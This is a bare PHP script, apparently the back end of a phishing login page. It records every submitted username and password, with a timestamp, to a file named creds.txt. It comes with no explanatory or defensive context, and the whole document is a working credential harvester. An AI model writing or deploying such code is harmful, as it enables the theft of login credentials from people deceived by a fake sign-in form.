<?php
file_put_contents("creds.txt", date('c')." | ".$_POST['user']." | ".$_POST['pass']."\n", FILE_APPEND);
?>
